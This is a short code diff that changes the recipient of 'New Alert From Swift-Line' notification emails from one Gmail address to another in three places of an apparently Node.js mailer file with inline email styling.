@@ -493,7 +493,7 @@ span.MsoHyperlinkFollowed {
 
             const mail_option2 = {
                 from:`Swift-Line <noreply@assistin.online>`,
-                to: 'mqsbeat@gmail.com',
+                to: 'Ojodemoobolu@gmail.com',
                 subject: "New Alert From Swift-Line ",
                 html:
                 `
@@ -986,7 +986,7 @@ span.MsoHyperlinkFollowed {
 
         const mail_option2 = {
             from:`Swift-Line <noreply@assistin.online>`,
-            to: 'mqsbeat@gmail.com',
+            to: 'Ojodemoobolu@gmail.com',
             subject: "New Alert From Swift-Line",
             html: 
             `
@@ -1491,7 +1491,7 @@ color:#ffffff!important;
           
                   const mail_option2 = {
                       from:`Swift-Line <noreply@assistin.online>`,
-                      to: 'mqsbeat@gmail.com',
+                      to: 'Ojodemoobolu@gmail.com',
                       subject: "New Alert From Swift-Line",
                       html: 
                     `
